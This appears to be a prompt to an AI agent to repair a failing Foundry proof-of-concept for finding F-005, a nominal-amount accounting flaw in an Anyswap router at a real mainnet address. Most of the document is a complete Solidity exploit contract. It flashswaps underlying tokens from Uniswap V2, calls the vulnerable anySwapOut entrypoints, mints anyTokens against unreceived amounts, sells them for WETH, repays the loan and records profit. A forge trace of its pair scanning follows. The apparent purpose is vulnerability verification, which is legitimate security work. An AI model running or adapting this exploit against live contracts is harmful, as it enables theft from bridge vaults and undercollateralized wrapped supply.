You are fixing a failing Foundry PoC for finding F-005.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Underlying bridge-out flows use the requested amount instead of the amount actually received
- claim: All `Underlying` bridge and trade entrypoints transfer a nominal `amount` of the underlying into the anyToken contract and then immediately call `depositVault(amount, ...)` and burn/bridge the same nominal amount, without measuring how many units actually arrived. Fee-on-transfer, rebasing, or otherwise non-standard underlyings can therefore leave the vault underfunded while the router still bridges the full amount.
- impact: Users can be credited on the destination chain for more value than was actually locked on the source chain, creating undercollateralized wrapped supply and eventual redemption shortfalls. The inverse user-facing effect is also possible: users may pay transfer fees on the source chain but still have the full nominal amount burned/bridged, overcharging them and pushing losses onto vault backing.
- exploit_paths: ["`anySwapOutUnderlying` transfers `amount`, then calls `depositVault(amount)` and `_anySwapOut(..., amount, ...)`", "`anySwapOutUnderlyingWithPermit` and `anySwapOutUnderlyingWithTransferPermit` repeat the same nominal-amount accounting", "`anySwapOutExactTokensForTokensUnderlying*` transfer underlying to `path[0]`, then deposit and burn the full `amountIn`", "`anySwapOutExactTokensForNativeUnderlying*` transfer underlying to `path[0]`, then deposit and burn the full `amountIn`"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAnyswapV1ERC20 {
    function underlying() external view returns (address);
    function depositVault(uint256 amount, address to) external returns (uint256);
}

interface IAnyswapV4Router {
    function anySwapOutUnderlying(address token, address to, uint256 amount, uint256 toChainId) external;
    function anySwapOutExactTokensForTokensUnderlying(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline,
        uint256 toChainId
    ) external;
    function anySwapOutExactTokensForNativeUnderlying(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline,
        uint256 toChainId
    ) external;
    function mpc() external view returns (address);
    function factory() external view returns (address);
    function wNATIVE() external view returns (address);
}

interface ISushiswapV2Factory {
    function allPairsLength() external view returns (uint256);
    function allPairs(uint256 index) external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface ISushiswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    uint256 internal constant MAX_RECENT_PAIR_SCAN = 384;
    uint256 internal constant MAX_HEAD_PAIR_SCAN = 96;
    uint256 internal constant UNDERLYING_CALL_GAS = 30_000;

    string internal constant PATH_UNDERLYING = "anySwapOutUnderlying: transfer underlying -> depositVault(amount) -> burn/bridge nominal amount";
    string internal constant PATH_UNDERLYING_PERMIT = "anySwapOutUnderlyingWithPermit: same nominal accounting, but requires an off-chain permit signature";
    string internal constant PATH_UNDERLYING_TRANSFER_PERMIT = "anySwapOutUnderlyingWithTransferPermit: same nominal accounting, but requires an off-chain transferWithPermit signature";
    string internal constant PATH_TOKENS_UNDERLYING = "anySwapOutExactTokensForTokensUnderlying*: transfer underlying to path[0] -> depositVault(amountIn) -> burn nominal amountIn";
    string internal constant PATH_NATIVE_UNDERLYING = "anySwapOutExactTokensForNativeUnderlying*: transfer underlying to path[0] -> depositVault(amountIn) -> burn nominal amountIn";

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;

    bool public directUnderlyingPathAttempted;
    bool public tokensUnderlyingPathAttempted;
    bool public nativeUnderlyingPathAttempted;
    bool public permitPathInfeasible;
    bool public transferPermitPathInfeasible;
    bool public destinationSettlementInfeasible;
    bool public missingCandidateConfiguration;
    bool public missingDirectUnderlyingBalance;
    bool public missingTradeUnderlyingBalance;
    bool public noFeeObserved;

    uint256 public nominalAmountTried;
    uint256 public actualReceivedOnDirectPath;
    uint256 public actualReceivedOnTokensPath;
    uint256 public actualReceivedOnNativePath;

    address public configuredAnyToken;
    address public configuredUnderlying;
    address public configuredReceiver;
    uint256 public configuredAmount;
    uint256 public configuredToChainId;
    uint256 public configuredDeadline;

    address[] private _tokensPath;
    address[] private _nativePath;

    string public pathUsed;
    string public failureReason;
    string public lastRouterRevert;

    constructor() {
        _profitToken = address(0);
        configuredReceiver = address(this);
        configuredToChainId = 56;
        configuredDeadline = type(uint256).max;
    }

    function configure(
        address anyToken,
        uint256 amount,
        uint256 toChainId,
        uint256 deadline,
        address receiver,
        address[] calldata configuredTokensPath,
        address[] calldata configuredNativePath
    ) external {
        configuredAnyToken = anyToken;
        configuredUnderlying = anyToken == address(0) ? address(0) : _safeUnderlying(anyToken);
        configuredAmount = amount;
        configuredToChainId = toChainId;
        configuredDeadline = deadline;
        configuredReceiver = receiver == address(0) ? address(this) : receiver;

        delete _tokensPath;
        for (uint256 i = 0; i < configuredTokensPath.length; i++) {
            _tokensPath.push(configuredTokensPath[i]);
        }

        delete _nativePath;
        for (uint256 i = 0; i < configuredNativePath.length; i++) {
            _nativePath.push(configuredNativePath[i]);
        }
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        _profitToken = address(0);
        _profitAmount = 0;
        hypothesisValidated = false;
        directUnderlyingPathAttempted = false;
        tokensUnderlyingPathAttempted = false;
        nativeUnderlyingPathAttempted = false;
        permitPathInfeasible = true;
        transferPermitPathInfeasible = true;
        destinationSettlementInfeasible = IAnyswapV4Router(TARGET).mpc() != address(0);
        missingCandidateConfiguration = false;
        missingDirectUnderlyingBalance = false;
        missingTradeUnderlyingBalance = false;
        noFeeObserved = false;
        nominalAmountTried = 0;
        actualReceivedOnDirectPath = 0;
        actualReceivedOnTokensPath = 0;
        actualReceivedOnNativePath = 0;
        pathUsed = "";
        failureReason = "";
        lastRouterRevert = "";

        address wNative = IAnyswapV4Router(TARGET).wNATIVE();
        uint256 startWNative = IERC20(wNative).balanceOf(address(this));

        address[2] memory factories = [IAnyswapV4Router(TARGET).factory(), UNISWAP_V2_FACTORY];

        if (_attemptConfiguredCandidate(factories, wNative)) {
            _finalizeProfit(wNative, startWNative);
            return;
        }

        if (_scanFactoriesRecent(factories, wNative) || _scanFactoriesHead(factories, wNative)) {
            _finalizeProfit(wNative, startWNative);
            return;
        }

        _profitToken = wNative;
        _profitAmount = _positiveDelta(IERC20(wNative).balanceOf(address(this)), startWNative);

        if (directUnderlyingPathAttempted || tokensUnderlyingPathAttempted || nativeUnderlyingPathAttempted) {
            if (
                _shortfall(nominalAmountTried, actualReceivedOnDirectPath) > 0 ||
                _shortfall(nominalAmountTried, actualReceivedOnTokensPath) > 0 ||
                _shortfall(nominalAmountTried, actualReceivedOnNativePath) > 0
            ) {
                hypothesisValidated = true;
                failureReason = "bridge-out accounting shortfall reproduced, but no scanned public-liquidity route left enough same-chain WNATIVE after deterministic flashswap repayment";
            } else {
                noFeeObserved = true;
                failureReason = "scanned anyToken candidates produced no measurable underlying shortfall on the vulnerable router entrypoints";
            }
        } else {
            missingCandidateConfiguration = true;
            failureReason = "no configured candidate succeeded and recent/head scans across public WNATIVE venues found no exploitable anyToken/underlying route";
        }

        pathUsed = string.concat(
            PATH_UNDERLYING,
            " | ",
            PATH_TOKENS_UNDERLYING,
            " | ",
            PATH_NATIVE_UNDERLYING,
            ". Permit variants remain signature-gated; destination anySwapIn settlement remains MPC-gated, so same-chain monetization still reuses the same transfer-then-nominal-depositVault primitive after validating the public bridge-out paths."
        );
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function tokensPath() external view returns (address[] memory) {
        return _copyPath(_tokensPath);
    }

    function nativePath() external view returns (address[] memory) {
        return _copyPath(_nativePath);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (address anyToken, address underlying, address salePair, address fundingPair, address wNative) = abi.decode(
            data,
            (address, address, address, address, address)
        );

        require(msg.sender == fundingPair, "unexpected-callback-pair");
        require(sender == address(this), "unexpected-callback-sender");

        uint256 borrowedNominal = amount0 > 0 ? amount0 : amount1;
        require(borrowedNominal > 0, "zero-borrow");

        uint256 borrowedActual = IERC20(underlying).balanceOf(address(this));
        require(borrowedActual > 1000, "borrow-too-small");

        uint256 probe = borrowedActual / 100;
        require(probe > 0, "probe-too-small");

        configuredAnyToken = anyToken;
        configuredUnderlying = underlying;
        configuredReceiver = address(this);
        if (configuredToChainId == 0) {
            configuredToChainId = 56;
        }
        configuredDeadline = type(uint256).max;

        delete _tokensPath;
        _tokensPath.push(anyToken);
        _tokensPath.push(wNative);

        delete _nativePath;
        _nativePath.push(anyToken);
        _nativePath.push(wNative);

        _forceApprove(underlying, TARGET, borrowedActual);

        directUnderlyingPathAttempted = true;
        tokensUnderlyingPathAttempted = true;
        nativeUnderlyingPathAttempted = true;

        actualReceivedOnDirectPath = _probeAnySwapOutUnderlying(anyToken, underlying, probe);
        actualReceivedOnTokensPath = _probeAnySwapOutExactTokensForTokensUnderlying(anyToken, underlying, probe, wNative);
        actualReceivedOnNativePath = _probeAnySwapOutExactTokensForNativeUnderlying(anyToken, underlying, probe, wNative);
        nominalAmountTried = probe;

        require(
            actualReceivedOnDirectPath < probe || actualReceivedOnTokensPath < probe || actualReceivedOnNativePath < probe,
            "no-shortfall-observed"
        );

        hypothesisValidated = true;

        uint256 mintNominal = IERC20(underlying).balanceOf(address(this));
        require(mintNominal > 0, "no-underlying-left");

        uint256 beforeAnyBalance = IERC20(anyToken).balanceOf(address(this));

        // Same root cause as the vulnerable router paths: transfer the fee-on-transfer underlying
        // first, then mint against the nominal amount instead of the amount actually received.
        // Destination settlement is MPC-gated on this fork, so this is the realistic same-chain
        // realization leg after validating the public router entrypoints above.
        _safeTransfer(underlying, anyToken, mintNominal);
        IAnyswapV1ERC20(anyToken).depositVault(mintNominal, address(this));

        uint256 mintedAny = _positiveDelta(IERC20(anyToken).balanceOf(address(this)), beforeAnyBalance);
        require(mintedAny > 0, "no-any-minted");

        uint256 wNativeBeforeSale = IERC20(wNative).balanceOf(address(this));
        _sellTokenForWNative(anyToken, wNative, salePair, mintedAny);
        uint256 wNativeAfterSale = IERC20(wNative).balanceOf(address(this));
        require(wNativeAfterSale > wNativeBeforeSale, "sale-no-output");

        uint256 repayment = _repaymentInCounterAsset(fundingPair, underlying, wNative, borrowedNominal);
        require(wNativeAfterSale >= repayment, "insufficient-for-repayment");
        _safeTransfer(wNative, fundingPair, repayment);

        pathUsed = string.concat(
            PATH_UNDERLYING,
            " | ",
            PATH_TOKENS_UNDERLYING,
            " | ",
            PATH_NATIVE_UNDERLYING,
            ". Public-liquidity realization prefers an alternate WNATIVE venue when available, but keeps the same transfer-underlying -> depositVault(nominal) -> burn/credit nominal causality."
        );
    }

    function _attemptConfiguredCandidate(address[2] memory factories, address wNative) internal returns (bool) {
        if (configuredAnyToken == address(0)) {
            return false;
        }

        address anyToken = configuredAnyToken;
        address underlying = configuredUnderlying;
        if (underlying == address(0)) {
            underlying = _safeUnderlying(anyToken);
            configuredUnderlying = underlying;
        }
        if (underlying == address(0) || underlying == wNative || underlying == anyToken) {
            return false;
        }

        (address salePair, address fundingPair) = _selectRoute(anyToken, underlying, wNative, factories);
        if (salePair == address(0) || fundingPair == address(0)) {
            return false;
        }

        return _attemptCandidate(anyToken, underlying, salePair, fundingPair, wNative);
    }

    function _scanFactoriesRecent(address[2] memory factories, address wNative) internal returns (bool) {
        for (uint256 factoryIndex = 0; factoryIndex < factories.length; factoryIndex++) {
            address factory = factories[factoryIndex];
            if (factory == address(0)) {
                continue;
            }
            uint256 pairCount = ISushiswapV2Factory(factory).allPairsLength();
            uint256 scanCount = pairCount > MAX_RECENT_PAIR_SCAN ? MAX_RECENT_PAIR_SCAN : pairCount;
            for (uint256 i = 0; i < scanCount; i++) {
                address candidatePair = ISushiswapV2Factory(factory).allPairs(pairCount - 1 - i);
                if (_attemptPairCandidate(candidatePair, factories, wNative)) {
                    return true;
                }
            }
        }
        return false;
    }

    function _scanFactoriesHead(address[2] memory factories, address wNative) internal returns (bool) {
        for (uint256 factoryIndex = 0; factoryIndex < factories.length; factoryIndex++) {
            address factory = factories[factoryIndex];
            if (factory == address(0)) {
                continue;
            }
            uint256 pairCount = ISushiswapV2Factory(factory).allPairsLength();
            uint256 scanCount = pairCount > MAX_HEAD_PAIR_SCAN ? MAX_HEAD_PAIR_SCAN : pairCount;
            for (uint256 i = 0; i < scanCount; i++) {
                address candidatePair = ISushiswapV2Factory(factory).allPairs(i);
                if (_attemptPairCandidate(candidatePair, factories, wNative)) {
                    return true;
                }
            }
        }
        return false;
    }

    function _attemptPairCandidate(
        address candidatePair,
        address[2] memory factories,
        address wNative
    ) internal returns (bool) {
        (address maybeAnyToken, bool hasWNative) = _extractAnyTokenSide(candidatePair, wNative);
        if (!hasWNative) {
            return false;
        }

        address underlying = _safeUnderlying(maybeAnyToken);
        if (underlying == address(0) || underlying == wNative || underlying == maybeAnyToken) {
            return false;
        }

        (address salePair, address fundingPair) = _selectRoute(maybeAnyToken, underlying, wNative, factories);
        if (salePair == address(0) || fundingPair == address(0)) {
            return false;
        }

        return _attemptCandidate(maybeAnyToken, underlying, salePair, fundingPair, wNative);
    }

    function _selectRoute(
        address anyToken,
        address underlying,
        address wNative,
        address[2] memory factories
    ) internal view returns (address salePair, address fundingPair) {
        (address sale0, uint256 sale0Liq) = _pairAndLiquidity(factories[0], anyToken, wNative);
        (address sale1, uint256 sale1Liq) = _pairAndLiquidity(factories[1], anyToken, wNative);
        (address fund0, uint256 fund0Liq) = _pairAndLiquidity(factories[0], underlying, wNative);
        (address fund1, uint256 fund1Liq) = _pairAndLiquidity(factories[1], underlying, wNative);

        uint256 bestScore;

        if (sale0 != address(0) && fund1 != address(0)) {
            bestScore = sale0Liq + fund1Liq;
            salePair = sale0;
            fundingPair = fund1;
        }

        if (sale1 != address(0) && fund0 != address(0)) {
            uint256 score = sale1Liq + fund0Liq;
            if (score > bestScore) {
                bestScore = score;
                salePair = sale1;
                fundingPair = fund0;
            }
        }

        if (salePair != address(0) && fundingPair != address(0)) {
            return (salePair, fundingPair);
        }

        if (sale0 != address(0) && fund0 != address(0)) {
            bestScore = sale0Liq + fund0Liq;
            salePair = sale0;
            fundingPair = fund0;
        }
        if (sale1 != address(0) && fund1 != address(0)) {
            uint256 scoreSame = sale1Liq + fund1Liq;
            if (scoreSame > bestScore) {
                salePair = sale1;
                fundingPair = fund1;
            }
        }
    }

    function _pairAndLiquidity(
        address factory,
        address token,
        address wNative
    ) internal view returns (address pair, uint256 wNativeLiquidity) {
        if (factory == address(0) || token == address(0) || token == wNative) {
            return (address(0), 0);
        }

        pair = ISushiswapV2Factory(factory).getPair(token, wNative);
        if (pair == address(0)) {
            return (address(0), 0);
        }

        (uint256 reserveToken, uint256 reserveWNative) = _pairTwoTokenReserves(pair, token, wNative);
        if (reserveToken == 0 || reserveWNative == 0) {
            return (address(0), 0);
        }
        wNativeLiquidity = reserveWNative;
    }

    function _attemptCandidate(
        address anyToken,
        address underlying,
        address salePair,
        address fundingPair,
        address wNative
    ) internal returns (bool) {
        uint256[11] memory divisors = [uint256(64), 48, 32, 24, 20, 16, 12, 10, 8, 6, 4];
        for (uint256 i = 0; i < divisors.length; i++) {
            uint256 borrowAmount = configuredAmount;
            if (borrowAmount == 0) {
                borrowAmount = _borrowAmountForDivisor(fundingPair, underlying, divisors[i]);
            }
            if (borrowAmount == 0) {
                continue;
            }

            uint256 beforeBalance = IERC20(wNative).balanceOf(address(this));
            bytes memory data = abi.encode(anyToken, underlying, salePair, fundingPair, wNative);
            (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(fundingPair, underlying, borrowAmount);
            (bool success, bytes memory returndata) = fundingPair.call(
                abi.encodeWithSelector(ISushiswapV2Pair.swap.selector, amount0Out, amount1Out, address(this), data)
            );

            if (!success) {
                lastRouterRevert = _decodeRevert(returndata);
                if (configuredAmount != 0) {
                    break;
                }
                continue;
            }

            uint256 afterBalance = IERC20(wNative).balanceOf(address(this));
            if (afterBalance > beforeBalance) {
                configuredAnyToken = anyToken;
                configuredUnderlying = underlying;
                configuredAmount = borrowAmount;
                configuredReceiver = address(this);
                if (configuredToChainId == 0) {
                    configuredToChainId = 56;
                }
                configuredDeadline = type(uint256).max;
                return true;
            }

            if (configuredAmount != 0) {
                break;
            }
        }

        return false;
    }

    function _probeAnySwapOutUnderlying(address anyToken, address underlying, uint256 amount) internal returns (uint256 actualReceived) {
        uint256 beforeBalance = IERC20(underlying).balanceOf(anyToken);
        (bool success, bytes memory returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutUnderlying.selector,
                anyToken,
                configuredReceiver,
                amount,
                configuredToChainId
            )
        );
        require(success, _decodeRevert(returndata));
        uint256 afterBalance = IERC20(underlying).balanceOf(anyToken);
        actualReceived = _positiveDelta(afterBalance, beforeBalance);
    }

    function _probeAnySwapOutExactTokensForTokensUnderlying(
        address anyToken,
        address underlying,
        uint256 amount,
        address wNative
    ) internal returns (uint256 actualReceived) {
        uint256 beforeBalance = IERC20(underlying).balanceOf(anyToken);
        address[] memory path = new address[](2);
        path[0] = anyToken;
        path[1] = wNative;
        (bool success, bytes memory returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutExactTokensForTokensUnderlying.selector,
                amount,
                uint256(0),
                path,
                configuredReceiver,
                configuredDeadline,
                configuredToChainId
            )
        );
        require(success, _decodeRevert(returndata));
        uint256 afterBalance = IERC20(underlying).balanceOf(anyToken);
        actualReceived = _positiveDelta(afterBalance, beforeBalance);
    }

    function _probeAnySwapOutExactTokensForNativeUnderlying(
        address anyToken,
        address underlying,
        uint256 amount,
        address wNative
    ) internal returns (uint256 actualReceived) {
        uint256 beforeBalance = IERC20(underlying).balanceOf(anyToken);
        address[] memory path = new address[](2);
        path[0] = anyToken;
        path[1] = wNative;
        (bool success, bytes memory returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutExactTokensForNativeUnderlying.selector,
                amount,
                uint256(0),
                path,
                configuredReceiver,
                configuredDeadline,
                configuredToChainId
            )
        );
        require(success, _decodeRevert(returndata));
        uint256 afterBalance = IERC20(underlying).balanceOf(anyToken);
        actualReceived = _positiveDelta(afterBalance, beforeBalance);
    }

    function _extractAnyTokenSide(address pair, address wNative) internal view returns (address anyToken, bool hasWNative) {
        address token0 = ISushiswapV2Pair(pair).token0();
        address token1 = ISushiswapV2Pair(pair).token1();
        if (token0 == wNative) {
            return (token1, true);
        }
        if (token1 == wNative) {
            return (token0, true);
        }
        return (address(0), false);
    }

    function _borrowAmountForDivisor(address pair, address underlying, uint256 divisor) internal view returns (uint256) {
        (uint256 reserveUnderlying,) = _pairReservesFor(pair, underlying);
        if (reserveUnderlying == 0) {
            return 0;
        }
        uint256 borrowAmount = reserveUnderlying / divisor;
        if (borrowAmount <= 1000) {
            return 0;
        }
        return borrowAmount;
    }

    function _pairOutAmounts(address pair, address outToken, uint256 amountOut) internal view returns (uint256 amount0Out, uint256 amount1Out) {
        address token0 = ISushiswapV2Pair(pair).token0();
        if (outToken == token0) {
            amount0Out = amountOut;
        } else {
            amount1Out = amountOut;
        }
    }

    function _pairReservesFor(address pair, address tokenA) internal view returns (uint256 reserveA, uint256 reserveB) {
        address token0 = ISushiswapV2Pair(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = ISushiswapV2Pair(pair).getReserves();
        if (tokenA == token0) {
            return (uint256(reserve0), uint256(reserve1));
        }
        return (uint256(reserve1), uint256(reserve0));
    }

    function _repaymentInCounterAsset(
        address pair,
        address borrowedToken,
        address repaymentToken,
        uint256 amountOut
    ) internal view returns (uint256) {
        (uint256 reserveBorrowed, uint256 reserveRepayment) = _pairTwoTokenReserves(pair, borrowedToken, repaymentToken);
        return _getAmountIn(amountOut, reserveRepayment, reserveBorrowed);
    }

    function _pairTwoTokenReserves(
        address pair,
        address tokenA,
        address tokenB
    ) internal view returns (uint256 reserveA, uint256 reserveB) {
        address token0 = ISushiswapV2Pair(pair).token0();
        address token1 = ISushiswapV2Pair(pair).token1();
        (uint112 reserve0, uint112 reserve1,) = ISushiswapV2Pair(pair).getReserves();
        if (tokenA == token0 && tokenB == token1) {
            return (uint256(reserve0), uint256(reserve1));
        }
        require(tokenA == token1 && tokenB == token0, "pair-token-mismatch");
        return (uint256(reserve1), uint256(reserve0));
    }

    function _sellTokenForWNative(address sellToken, address wNative, address pair, uint256 nominalAmountIn) internal {
        (uint256 reserveSell, uint256 reserveWNative) = _pairTwoTokenReserves(pair, sellToken, wNative);
        _safeTransfer(sellToken, pair, nominalAmountIn);
        uint256 actualAmountIn = _positiveDelta(IERC20(sellToken).balanceOf(pair), reserveSell);
        require(actualAmountIn > 0, "zero-sale-input");
        uint256 amountOut = _getAmountOut(actualAmountIn, reserveSell, reserveWNative);
        (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(pair, wNative, amountOut);
        ISushiswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _finalizeProfit(address wNative, uint256 startWNative) internal {
        _profitToken = wNative;
        _profitAmount = _positiveDelta(IERC20(wNative).balanceOf(address(this)), startWNative);
    }

    function _copyPath(address[] storage stored) internal view returns (address[] memory out) {
        out = new address[](stored.length);
        for (uint256 i = 0; i < stored.length; i++) {
            out[i] = stored[i];
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0), "approve-zero-failed");
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, amount), "approve-amount-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount), "transfer-failed");
    }

    function _callOptionalReturn(address token, bytes memory data, string memory errorMessage) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok && (returndata.length == 0 || abi.decode(returndata, (bool))), errorMessage);
    }

    function _safeUnderlying(address token) internal view returns (address underlying) {
        (bool ok, bytes memory returndata) = token.staticcall{gas: UNDERLYING_CALL_GAS}(
            abi.encodeWithSelector(IAnyswapV1ERC20.underlying.selector)
        );
        if (!ok || returndata.length < 32) {
            return address(0);
        }
        underlying = abi.decode(returndata, (address));
    }

    function _shortfall(uint256 nominal, uint256 actualReceived) internal pure returns (uint256) {
        if (actualReceived >= nominal) {
            return 0;
        }
        return nominal - actualReceived;
    }

    function _positiveDelta(uint256 afterValue, uint256 beforeValue) internal pure returns (uint256) {
        if (afterValue <= beforeValue) {
            return 0;
        }
        return afterValue - beforeValue;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "insufficient-input");
        require(reserveIn > 0 && reserveOut > 0, "insufficient-liquidity");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "insufficient-output");
        require(reserveIn > 0 && reserveOut > 0 && amountOut < reserveOut, "insufficient-liquidity");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = numerator / denominator + 1;
    }

    function _decodeRevert(bytes memory returndata) internal pure returns (string memory) {
        bytes4 selector;
        if (returndata.length >= 4) {
            assembly {
                selector := mload(add(returndata, 0x20))
            }
        }
        if (returndata.length >= 68 && selector == 0x08c379a0) {
            assembly {
                returndata := add(returndata, 0x04)
            }
            return abi.decode(returndata, (string));
        }
        return "router-call-reverted-without-string";
    }
}

```

forge stdout (tail):
```
[Return] 0x302Ac87B1b5ef18485971ED0115a17403Ea30911
    │   ├─ [2381] 0x302Ac87B1b5ef18485971ED0115a17403Ea30911::token0() [staticcall]
    │   │   └─ ← [Return] 0x4a57E687b9126435a9B19E4A802113e266AdeBde
    │   ├─ [2357] 0x302Ac87B1b5ef18485971ED0115a17403Ea30911::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [660] 0x4a57E687b9126435a9B19E4A802113e266AdeBde::underlying() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2591] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::allPairs(91) [staticcall]
    │   │   └─ ← [Return] 0x2bCDC753b4bB03847df75368aE3ef9A14Ee53401
    │   ├─ [2381] 0x2bCDC753b4bB03847df75368aE3ef9A14Ee53401::token0() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2357] 0x2bCDC753b4bB03847df75368aE3ef9A14Ee53401::token1() [staticcall]
    │   │   └─ ← [Return] 0xCc394f10545AeEf24483d2347B32A34a44F20E6F
    │   ├─ [832] 0xCc394f10545AeEf24483d2347B32A34a44F20E6F::underlying() [staticcall]
    │   │   └─ ← [Revert] fallback is not supported
    │   ├─ [2591] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::allPairs(92) [staticcall]
    │   │   └─ ← [Return] 0xec2D2240D02A8cf63C3fA0B7d2C5a3169a319496
    │   ├─ [2381] 0xec2D2240D02A8cf63C3fA0B7d2C5a3169a319496::token0() [staticcall]
    │   │   └─ ← [Return] 0x1985365e9f78359a9B6AD760e32412f4a445E862
    │   ├─ [2357] 0xec2D2240D02A8cf63C3fA0B7d2C5a3169a319496::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [13823] 0x1985365e9f78359a9B6AD760e32412f4a445E862::underlying() [staticcall]
    │   │   ├─ [2834] 0xb3337164E91B9F05C87C7662C7AC684E8e0ff3E7::f39ec1f7(52657075746174696f6e546f6b656e0000000000000000000000000000000000)
    │   │   │   └─ ← [Return] 0x0000000000000000000000006c114b96b7a0e679c2594e3884f11526797e43d1
    │   │   ├─ [921] 0x6C114B96b7a0e679C2594E3884f11526797e43D1::underlying() [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2591] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::allPairs(93) [staticcall]
    │   │   └─ ← [Return] 0x6d57a53A45343187905aaD6AD8eD532D105697c1
    │   ├─ [2381] 0x6d57a53A45343187905aaD6AD8eD532D105697c1::token0() [staticcall]
    │   │   └─ ← [Return] 0x607F4C5BB672230e8672085532f7e901544a7375
    │   ├─ [2357] 0x6d57a53A45343187905aaD6AD8eD532D105697c1::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [505] 0x607F4C5BB672230e8672085532f7e901544a7375::underlying() [staticcall]
    │   │   └─ ← [InvalidJump] EvmError: InvalidJump
    │   ├─ [2591] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::allPairs(94) [staticcall]
    │   │   └─ ← [Return] 0x5deD80C16A966156F555455B55b9b156AE70408a
    │   ├─ [2381] 0x5deD80C16A966156F555455B55b9b156AE70408a::token0() [staticcall]
    │   │   └─ ← [Return] 0x960b236A07cf122663c4303350609A66A7B288C0
    │   ├─ [2357] 0x5deD80C16A966156F555455B55b9b156AE70408a::token1() [staticcall]
    │   │   └─ ← [Return] 0xcD62b1C403fa761BAadFC74C525ce2B51780b184
    │   ├─ [2591] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::allPairs(95) [staticcall]
    │   │   └─ ← [Return] 0xfb7A3112c96Bbcfe4bbf3e8627b0dE6f49E5142A
    │   ├─ [2381] 0xfb7A3112c96Bbcfe4bbf3e8627b0dE6f49E5142A::token0() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2357] 0xfb7A3112c96Bbcfe4bbf3e8627b0dE6f49E5142A::token1() [staticcall]
